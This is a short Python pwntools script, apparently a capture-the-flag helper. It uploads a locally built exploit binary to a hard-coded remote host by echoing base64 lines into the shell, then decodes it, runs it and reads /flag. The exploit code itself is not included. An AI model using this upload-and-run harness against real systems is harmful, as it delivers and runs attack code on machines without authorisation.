from pwn import *
import time, os

start = time.time()
p = remote("103.152.118.49", 33499)

os.system("tar -czvf exp.tar.gz ./exploit")
os.system("base64 exp.tar.gz > b64_exp")

f = open("./b64_exp", "r")

p.sendline()
p.recvuntil(b"~ $")
p.sendline(b"echo '' > b64_exp;")

count = 1
while True:
    print('now line: ' + str(count))
    line = f.readline().replace("\n","")
    if len(line)<=0:
        break
    cmd = b"echo '" + line.encode() + b"' >> b64_exp;"
    p.sendline(cmd) # send lines
    time.sleep(0.01)
    p.recvuntil("~ $")
    count += 1
f.close()

total_time = time.time() - start
command = f"echo -e '{total_time}\n' >> time_consume"
os.system(command)
p.sendline("base64 -d b64_exp > exp.tar.gz;")
p.sendline("tar -xzvf exp.tar.gz")
p.sendline("./exp")
p.sendline("cat /flag")
p.interactive()

